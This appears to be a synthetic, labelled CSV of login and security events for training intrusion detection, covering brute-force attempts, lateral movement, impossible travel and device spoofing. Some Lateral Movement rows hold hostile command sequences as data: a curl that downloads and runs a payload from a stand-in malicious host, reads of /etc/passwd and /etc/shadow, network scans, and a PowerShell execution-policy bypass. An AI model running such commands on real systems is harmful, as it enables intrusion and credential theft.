entity_id,entity_type,timestamp,source_ip,geo_location,resource_accessed,auth_method,session_duration,command_sequence,device_fingerprint,login_success,label
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:35:36,187.58.158.86,"Lake Elizabeth, Guatemala",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:35:52,187.58.158.86,"Port Kerry, Mozambique",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:36:12,187.58.158.86,"North Julie, Guinea-Bissau",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:36:39,187.58.158.86,"North Marcia, San Marino",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
10ac684d-66f5-45fb-8c60-57a6e0ee966a,User,2026-06-26 08:49:08,93.164.182.168,"South Nicholas, Falkland Islands (Malvinas)",Jira,Password,6678,ping -> ssh admin@10.0.0.5 -> sudo su,Windows 11 - Chrome,True,Lateral Movement
10ac684d-66f5-45fb-8c60-57a6e0ee966a,User,2026-06-26 08:58:08,93.164.182.168,"South Nicholas, Falkland Islands (Malvinas)",Database,Password,2646,powershell.exe -ExecutionPolicy Bypass -File recon.ps1,Windows 11 - Chrome,True,Lateral Movement
10ac684d-66f5-45fb-8c60-57a6e0ee966a,User,2026-06-26 09:05:08,93.164.182.168,"South Nicholas, Falkland Islands (Malvinas)",Email,Password,6023,curl http://malicious.ip/payload.sh -> chmod +x payload.sh -> ./payload.sh,Windows 11 - Chrome,True,Lateral Movement
b7f1bcc2-cf0d-489e-8b5b-96b55581efbe,User,2026-06-26 10:03:37,31.151.213.246,"West Jessica, Nicaragua",GitLab,SSO,2949,N/A,Unknown Browser/Device,True,Impossible Travel
ceda44ff-4a99-40be-af78-f6f1af598d50,User,2026-06-26 10:04:20,198.211.28.199,"North Matthew, Solomon Islands",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ceda44ff-4a99-40be-af78-f6f1af598d50,User,2026-06-26 10:04:23,198.211.28.199,"Oneillhaven, Ireland",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ceda44ff-4a99-40be-af78-f6f1af598d50,User,2026-06-26 10:04:24,198.211.28.199,"North Thomas, Ukraine",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ceda44ff-4a99-40be-af78-f6f1af598d50,User,2026-06-26 10:04:26,198.211.28.199,"Arnoldland, Hong Kong",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ceda44ff-4a99-40be-af78-f6f1af598d50,User,2026-06-26 10:04:28,198.211.28.199,"West Martin, Costa Rica",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ceda44ff-4a99-40be-af78-f6f1af598d50,User,2026-06-26 10:04:30,198.211.28.199,"Lake Gary, Zambia",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ceda44ff-4a99-40be-af78-f6f1af598d50,User,2026-06-26 10:04:32,198.211.28.199,"Lake Brianhaven, Uganda",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ceda44ff-4a99-40be-af78-f6f1af598d50,User,2026-06-26 10:04:35,198.211.28.199,"Karenport, Jersey",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ceda44ff-4a99-40be-af78-f6f1af598d50,User,2026-06-26 10:04:40,198.211.28.199,"Martinezmouth, Germany",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ceda44ff-4a99-40be-af78-f6f1af598d50,User,2026-06-26 10:04:40,198.211.28.199,"South Melissafurt, United States Minor Outlying Islands",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ceda44ff-4a99-40be-af78-f6f1af598d50,User,2026-06-26 10:04:41,198.211.28.199,"New Kathleen, United States Minor Outlying Islands",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ceda44ff-4a99-40be-af78-f6f1af598d50,User,2026-06-26 10:04:47,198.211.28.199,"North Carolland, Zambia",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ceda44ff-4a99-40be-af78-f6f1af598d50,User,2026-06-26 10:04:50,198.211.28.199,"Lake Erinstad, Papua New Guinea",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ceda44ff-4a99-40be-af78-f6f1af598d50,User,2026-06-26 10:05:02,198.211.28.199,"Lake Ashley, Palau",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ceda44ff-4a99-40be-af78-f6f1af598d50,User,2026-06-26 10:05:11,198.211.28.199,"East Rachelside, Algeria",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ceda44ff-4a99-40be-af78-f6f1af598d50,User,2026-06-26 10:05:12,198.211.28.199,"Mariebury, Antarctica (the territory South of 60 deg S)",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ceda44ff-4a99-40be-af78-f6f1af598d50,User,2026-06-26 10:05:15,198.211.28.199,"Bruceberg, Australia",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ceda44ff-4a99-40be-af78-f6f1af598d50,User,2026-06-26 10:05:40,198.211.28.199,"Briggsstad, Peru",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ceda44ff-4a99-40be-af78-f6f1af598d50,User,2026-06-26 10:05:50,198.211.28.199,"Wolfechester, China",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
0ba5f391-2bc4-4527-985d-14442c5740e6,User,2026-06-26 10:09:09,98.192.200.198,"South Nicolemouth, Guyana",CRM,Password,1067,N/A,BlackArch - Tor Browser - MAC: 02:50:b8:44:14:89,True,Device Spoofing
64a97223-3f7f-41ff-9f52-84bbcc2b756e,User,2026-06-26 10:20:14,195.133.155.70,"North Kimberly, Pakistan",HRIS,Hardware Token,6891,whoami -> net user /domain -> nmap -sT 10.0.0.0/24,Windows 11 - Chrome,True,Lateral Movement
64a97223-3f7f-41ff-9f52-84bbcc2b756e,User,2026-06-26 10:23:14,195.133.155.70,"North Kimberly, Pakistan",Confluence,Hardware Token,3833,ping -> ssh admin@10.0.0.5 -> sudo su,Windows 11 - Chrome,True,Lateral Movement
97930139-c9fd-4f8f-ba7d-6d4e27c7a21c,User,2026-06-26 10:55:21,10.218.222.32,"North Deborahbury, Pakistan",Confluence,MFA,433,N/A,BlackArch - Wget - MAC: b4:9c:4c:ff:ec:29,True,Device Spoofing
04d807a3-b988-4e58-ad34-c0a1a2a6cd47,User,2026-06-26 11:07:58,27.143.33.203,"East Rebekahborough, Austria",AWS Console,MFA,5995,powershell.exe -ExecutionPolicy Bypass -File recon.ps1,Windows 11 - Edge,True,Lateral Movement
8fb9b892-26d0-48d7-86b6-6e3cbc404ed2,Device,2026-06-26 11:09:28,50.77.96.92,"Lake Mark, Belgium",Confluence,MFA,1470,N/A,Unknown Browser/Device,True,Impossible Travel
04d807a3-b988-4e58-ad34-c0a1a2a6cd47,User,2026-06-26 11:11:58,27.143.33.203,"East Rebekahborough, Austria",CRM,MFA,3465,"arp -a -> wmic process call create ""cmd.exe /c set""",Windows 11 - Edge,True,Lateral Movement
04d807a3-b988-4e58-ad34-c0a1a2a6cd47,User,2026-06-26 11:17:58,27.143.33.203,"East Rebekahborough, Austria",VPN,MFA,6483,ping -> ssh admin@10.0.0.5 -> sudo su,Windows 11 - Edge,True,Lateral Movement
2944af51-359b-4bc1-9a62-68fff7882c1b,Device,2026-06-26 11:44:22,77.74.40.128,"Shannonburgh, Macao",Confluence,Hardware Token,1641,N/A,BlackArch - Wget - MAC: 0c:79:9b:f6:b0:db,True,Device Spoofing
3bd4c24d-86c3-4bc8-b5e9-bd9a297b07e5,User,2026-06-26 11:50:49,120.245.55.162,"New Adam, Tokelau",HRIS,Password,164,N/A,BlackArch - Tor Browser - MAC: 8e:f5:41:18:f3:ef,True,Device Spoofing
e10c8d43-b563-4107-977d-056d9c488116,User,2026-06-26 11:59:22,160.112.93.45,"Nelsonport, United Arab Emirates",VPN,Password,1291,cat /etc/passwd -> cat /etc/shadow -> su root,Windows 10 - Edge,True,Lateral Movement
f465eeec-8248-4ff4-b8ea-9b53880fb16b,User,2026-06-26 12:04:34,102.92.234.212,"Hendersonview, Malawi",AWS Console,Biometric,425,N/A,BlackArch - Tor Browser - MAC: 3a:db:a7:6c:ab:59,True,Device Spoofing
e10c8d43-b563-4107-977d-056d9c488116,User,2026-06-26 12:06:22,160.112.93.45,"Nelsonport, United Arab Emirates",VPN,Password,977,"arp -a -> wmic process call create ""cmd.exe /c set""",Windows 10 - Edge,True,Lateral Movement
a77b96c6-753e-4a32-9284-5dc4900f303c,Device,2026-06-26 12:19:47,145.187.100.169,"Hectorside, Reunion",Database,SSO,3035,N/A,Unknown Browser/Device,True,Impossible Travel
6cad6a25-b9e8-4285-ac91-60e5204c0071,User,2026-06-26 12:22:56,99.61.92.18,"West Eric, South Africa",Database,SSO,190,N/A,iOS 17 - Curl - MAC: e8:83:0f:51:09:9a,True,Device Spoofing
32bcf6d7-37e7-4bf2-a268-17b817fc0740,User,2026-06-26 13:49:14,55.232.68.227,"Cantrellfort, Benin",Jira,MFA,1528,N/A,Parrot OS - Tor Browser - MAC: e0:76:da:f2:95:ba,True,Device Spoofing
f6da7bd2-3393-4b65-94d4-2e74e6a45f7f,User,2026-06-26 13:51:04,107.93.9.159,"West Frank, Mongolia",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
f6da7bd2-3393-4b65-94d4-2e74e6a45f7f,User,2026-06-26 13:51:05,107.93.9.159,"East Raymond, Brunei Darussalam",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
f6da7bd2-3393-4b65-94d4-2e74e6a45f7f,User,2026-06-26 13:51:06,107.93.9.159,"Williamsonville, Montenegro",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
f6da7bd2-3393-4b65-94d4-2e74e6a45f7f,User,2026-06-26 13:51:08,107.93.9.159,"Robertshire, Israel",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
f6da7bd2-3393-4b65-94d4-2e74e6a45f7f,User,2026-06-26 13:51:13,107.93.9.159,"Christianbury, Timor-Leste",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
f6da7bd2-3393-4b65-94d4-2e74e6a45f7f,User,2026-06-26 13:51:20,107.93.9.159,"Harrisburgh, Vietnam",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
f6da7bd2-3393-4b65-94d4-2e74e6a45f7f,User,2026-06-26 13:51:28,107.93.9.159,"New Dawn, Afghanistan",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
f6da7bd2-3393-4b65-94d4-2e74e6a45f7f,User,2026-06-26 13:51:29,107.93.9.159,"East Christine, Bahamas",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
f6da7bd2-3393-4b65-94d4-2e74e6a45f7f,User,2026-06-26 13:51:31,107.93.9.159,"New Jeremyview, Niger",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
f6da7bd2-3393-4b65-94d4-2e74e6a45f7f,User,2026-06-26 13:51:32,107.93.9.159,"Port Joshuachester, Ethiopia",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
f6da7bd2-3393-4b65-94d4-2e74e6a45f7f,User,2026-06-26 13:51:40,107.93.9.159,"North Michael, Madagascar",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
f6da7bd2-3393-4b65-94d4-2e74e6a45f7f,User,2026-06-26 13:51:43,107.93.9.159,"Patrickport, Reunion",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
f6da7bd2-3393-4b65-94d4-2e74e6a45f7f,User,2026-06-26 13:51:44,107.93.9.159,"Mooreton, South Georgia and the South Sandwich Islands",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
f6da7bd2-3393-4b65-94d4-2e74e6a45f7f,User,2026-06-26 13:51:46,107.93.9.159,"Thomasport, Greece",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
f6da7bd2-3393-4b65-94d4-2e74e6a45f7f,User,2026-06-26 13:51:48,107.93.9.159,"Bradyton, Nicaragua",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
f6da7bd2-3393-4b65-94d4-2e74e6a45f7f,User,2026-06-26 13:51:54,107.93.9.159,"Richardland, Venezuela",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
f6da7bd2-3393-4b65-94d4-2e74e6a45f7f,User,2026-06-26 13:51:55,107.93.9.159,"Johnton, France",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
f6da7bd2-3393-4b65-94d4-2e74e6a45f7f,User,2026-06-26 13:52:04,107.93.9.159,"New Joshua, Kiribati",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
f6da7bd2-3393-4b65-94d4-2e74e6a45f7f,User,2026-06-26 13:52:19,107.93.9.159,"Lake Jenniferstad, Italy",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
a51da90c-f3fc-4ccf-89fe-4daf9fc71edf,User,2026-06-26 13:52:33,151.50.44.230,"West Bailey, Sudan",Jira,SSO,3375,N/A,Unknown Browser/Device,True,Impossible Travel
f6da7bd2-3393-4b65-94d4-2e74e6a45f7f,User,2026-06-26 13:52:39,107.93.9.159,"North Kaylamouth, Kiribati",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81f4f34e-60be-4e46-9273-bbab3137785b,User,2026-06-26 14:08:43,138.24.121.251,"East Keith, Netherlands Antilles",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81f4f34e-60be-4e46-9273-bbab3137785b,User,2026-06-26 14:08:45,138.24.121.251,"Austinshire, Haiti",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81f4f34e-60be-4e46-9273-bbab3137785b,User,2026-06-26 14:08:48,138.24.121.251,"Kimberlyberg, Armenia",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81f4f34e-60be-4e46-9273-bbab3137785b,User,2026-06-26 14:08:49,138.24.121.251,"Nicholasstad, Lesotho",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81f4f34e-60be-4e46-9273-bbab3137785b,User,2026-06-26 14:08:51,138.24.121.251,"Taylorfort, Heard Island and McDonald Islands",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81f4f34e-60be-4e46-9273-bbab3137785b,User,2026-06-26 14:08:53,138.24.121.251,"Sheilamouth, Fiji",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81f4f34e-60be-4e46-9273-bbab3137785b,User,2026-06-26 14:08:55,138.24.121.251,"West Kimberlyside, Costa Rica",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81f4f34e-60be-4e46-9273-bbab3137785b,User,2026-06-26 14:09:04,138.24.121.251,"Barkerfort, France",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81f4f34e-60be-4e46-9273-bbab3137785b,User,2026-06-26 14:09:05,138.24.121.251,"North Benjamin, Suriname",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81f4f34e-60be-4e46-9273-bbab3137785b,User,2026-06-26 14:09:06,138.24.121.251,"Martineztown, Nepal",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81f4f34e-60be-4e46-9273-bbab3137785b,User,2026-06-26 14:09:07,138.24.121.251,"West Rachel, Cambodia",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81f4f34e-60be-4e46-9273-bbab3137785b,User,2026-06-26 14:09:21,138.24.121.251,"Chavezview, Georgia",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81f4f34e-60be-4e46-9273-bbab3137785b,User,2026-06-26 14:09:23,138.24.121.251,"East Amber, United Kingdom",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81f4f34e-60be-4e46-9273-bbab3137785b,User,2026-06-26 14:09:23,138.24.121.251,"North Jeffreyside, Saudi Arabia",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81f4f34e-60be-4e46-9273-bbab3137785b,User,2026-06-26 14:09:25,138.24.121.251,"Angelafurt, North Macedonia",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81f4f34e-60be-4e46-9273-bbab3137785b,User,2026-06-26 14:09:27,138.24.121.251,"Swansonmouth, United Arab Emirates",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81f4f34e-60be-4e46-9273-bbab3137785b,User,2026-06-26 14:09:28,138.24.121.251,"Lake Kristychester, Antigua and Barbuda",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81f4f34e-60be-4e46-9273-bbab3137785b,User,2026-06-26 14:09:28,138.24.121.251,"New John, Moldova",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81f4f34e-60be-4e46-9273-bbab3137785b,User,2026-06-26 14:09:31,138.24.121.251,"Christopherstad, Sweden",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81f4f34e-60be-4e46-9273-bbab3137785b,User,2026-06-26 14:09:31,138.24.121.251,"New Michael, Kyrgyz Republic",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81f4f34e-60be-4e46-9273-bbab3137785b,User,2026-06-26 14:09:33,138.24.121.251,"Derekmouth, Guernsey",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81f4f34e-60be-4e46-9273-bbab3137785b,User,2026-06-26 14:09:37,138.24.121.251,"North Lisa, India",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81f4f34e-60be-4e46-9273-bbab3137785b,User,2026-06-26 14:09:39,138.24.121.251,"Jacobmouth, Kyrgyz Republic",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81f4f34e-60be-4e46-9273-bbab3137785b,User,2026-06-26 14:09:48,138.24.121.251,"Pereztown, Russian Federation",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81f4f34e-60be-4e46-9273-bbab3137785b,User,2026-06-26 14:09:51,138.24.121.251,"Port Katherineport, Zimbabwe",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81f4f34e-60be-4e46-9273-bbab3137785b,User,2026-06-26 14:10:23,138.24.121.251,"Kaylaport, Saint Kitts and Nevis",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
e11ff372-ecaf-4ab2-99d9-15313c5024a7,User,2026-06-26 14:49:55,187.157.225.74,"Tanyamouth, Qatar",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
e11ff372-ecaf-4ab2-99d9-15313c5024a7,User,2026-06-26 14:49:56,187.157.225.74,"Hillmouth, North Macedonia",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
e11ff372-ecaf-4ab2-99d9-15313c5024a7,User,2026-06-26 14:49:59,187.157.225.74,"West Shannonburgh, French Guiana",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
e11ff372-ecaf-4ab2-99d9-15313c5024a7,User,2026-06-26 14:50:07,187.157.225.74,"Harperfurt, Fiji",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
e11ff372-ecaf-4ab2-99d9-15313c5024a7,User,2026-06-26 14:50:07,187.157.225.74,"Lake Carolview, Spain",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
e11ff372-ecaf-4ab2-99d9-15313c5024a7,User,2026-06-26 14:50:11,187.157.225.74,"Webbborough, Cook Islands",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
e11ff372-ecaf-4ab2-99d9-15313c5024a7,User,2026-06-26 14:50:15,187.157.225.74,"Johnsonview, Equatorial Guinea",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
e11ff372-ecaf-4ab2-99d9-15313c5024a7,User,2026-06-26 14:50:16,187.157.225.74,"Michaelton, Yemen",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
e11ff372-ecaf-4ab2-99d9-15313c5024a7,User,2026-06-26 14:50:16,187.157.225.74,"Matthewport, Slovakia (Slovak Republic)",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
e11ff372-ecaf-4ab2-99d9-15313c5024a7,User,2026-06-26 14:50:17,187.157.225.74,"West Megan, Gibraltar",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
e11ff372-ecaf-4ab2-99d9-15313c5024a7,User,2026-06-26 14:50:20,187.157.225.74,"Port Amy, Dominican Republic",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
e11ff372-ecaf-4ab2-99d9-15313c5024a7,User,2026-06-26 14:50:20,187.157.225.74,"New Jonathanview, Luxembourg",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
e11ff372-ecaf-4ab2-99d9-15313c5024a7,User,2026-06-26 14:50:27,187.157.225.74,"North Kevinberg, Papua New Guinea",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
e11ff372-ecaf-4ab2-99d9-15313c5024a7,User,2026-06-26 14:50:40,187.157.225.74,"Deckerside, Bhutan",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
e11ff372-ecaf-4ab2-99d9-15313c5024a7,User,2026-06-26 14:50:41,187.157.225.74,"East Christopherside, Saint Kitts and Nevis",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
e11ff372-ecaf-4ab2-99d9-15313c5024a7,User,2026-06-26 14:50:43,187.157.225.74,"Blackwellhaven, Iceland",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
e11ff372-ecaf-4ab2-99d9-15313c5024a7,User,2026-06-26 14:50:46,187.157.225.74,"Laurachester, New Caledonia",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
e11ff372-ecaf-4ab2-99d9-15313c5024a7,User,2026-06-26 14:50:47,187.157.225.74,"Khantown, Kiribati",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
e11ff372-ecaf-4ab2-99d9-15313c5024a7,User,2026-06-26 14:50:52,187.157.225.74,"East Christopher, French Southern Territories",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
e11ff372-ecaf-4ab2-99d9-15313c5024a7,User,2026-06-26 14:50:55,187.157.225.74,"Lake Nataliefurt, Mauritania",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
e11ff372-ecaf-4ab2-99d9-15313c5024a7,User,2026-06-26 14:50:55,187.157.225.74,"South Melissa, Belarus",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
e11ff372-ecaf-4ab2-99d9-15313c5024a7,User,2026-06-26 14:50:59,187.157.225.74,"South Brenda, Anguilla",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
e11ff372-ecaf-4ab2-99d9-15313c5024a7,User,2026-06-26 14:51:05,187.157.225.74,"Davisview, Mauritius",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
e11ff372-ecaf-4ab2-99d9-15313c5024a7,User,2026-06-26 14:51:23,187.157.225.74,"West Edward, Guyana",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
e11ff372-ecaf-4ab2-99d9-15313c5024a7,User,2026-06-26 14:51:25,187.157.225.74,"Hernandezfort, Haiti",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
e11ff372-ecaf-4ab2-99d9-15313c5024a7,User,2026-06-26 14:51:31,187.157.225.74,"Paulmouth, Malaysia",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
e11ff372-ecaf-4ab2-99d9-15313c5024a7,User,2026-06-26 14:51:39,187.157.225.74,"Marissahaven, Guinea-Bissau",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
444d0f7c-7a51-4998-9e04-bbdf8b8de673,Device,2026-06-26 15:00:19,180.64.164.53,"Rubenfurt, Korea",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
444d0f7c-7a51-4998-9e04-bbdf8b8de673,Device,2026-06-26 15:00:21,180.64.164.53,"West Katiehaven, Taiwan",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
444d0f7c-7a51-4998-9e04-bbdf8b8de673,Device,2026-06-26 15:00:24,180.64.164.53,"North Johnton, Marshall Islands",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
444d0f7c-7a51-4998-9e04-bbdf8b8de673,Device,2026-06-26 15:00:25,180.64.164.53,"Estradaville, Lebanon",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
444d0f7c-7a51-4998-9e04-bbdf8b8de673,Device,2026-06-26 15:00:27,180.64.164.53,"West Jacobburgh, Nepal",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
444d0f7c-7a51-4998-9e04-bbdf8b8de673,Device,2026-06-26 15:00:28,180.64.164.53,"Charlesborough, Netherlands",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
444d0f7c-7a51-4998-9e04-bbdf8b8de673,Device,2026-06-26 15:00:29,180.64.164.53,"Porterside, Palau",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
444d0f7c-7a51-4998-9e04-bbdf8b8de673,Device,2026-06-26 15:00:30,180.64.164.53,"New Desiree, Central African Republic",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
444d0f7c-7a51-4998-9e04-bbdf8b8de673,Device,2026-06-26 15:00:31,180.64.164.53,"North Amy, Somalia",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
444d0f7c-7a51-4998-9e04-bbdf8b8de673,Device,2026-06-26 15:00:34,180.64.164.53,"Burnsborough, Jamaica",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
444d0f7c-7a51-4998-9e04-bbdf8b8de673,Device,2026-06-26 15:00:35,180.64.164.53,"West Edward, China",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
444d0f7c-7a51-4998-9e04-bbdf8b8de673,Device,2026-06-26 15:00:39,180.64.164.53,"Jonesfort, Seychelles",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
444d0f7c-7a51-4998-9e04-bbdf8b8de673,Device,2026-06-26 15:00:40,180.64.164.53,"Jessicachester, Samoa",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
444d0f7c-7a51-4998-9e04-bbdf8b8de673,Device,2026-06-26 15:00:51,180.64.164.53,"Port Daniel, Bangladesh",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
444d0f7c-7a51-4998-9e04-bbdf8b8de673,Device,2026-06-26 15:00:53,180.64.164.53,"Kellyton, Benin",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
444d0f7c-7a51-4998-9e04-bbdf8b8de673,Device,2026-06-26 15:00:55,180.64.164.53,"Sarahberg, Australia",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
444d0f7c-7a51-4998-9e04-bbdf8b8de673,Device,2026-06-26 15:00:58,180.64.164.53,"Shannonland, Uzbekistan",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
444d0f7c-7a51-4998-9e04-bbdf8b8de673,Device,2026-06-26 15:01:01,180.64.164.53,"Keithborough, Trinidad and Tobago",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
444d0f7c-7a51-4998-9e04-bbdf8b8de673,Device,2026-06-26 15:01:01,180.64.164.53,"Lauraport, Ethiopia",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
444d0f7c-7a51-4998-9e04-bbdf8b8de673,Device,2026-06-26 15:01:05,180.64.164.53,"Lake Lori, Turkmenistan",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
444d0f7c-7a51-4998-9e04-bbdf8b8de673,Device,2026-06-26 15:01:17,180.64.164.53,"Lake Angela, United States Minor Outlying Islands",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
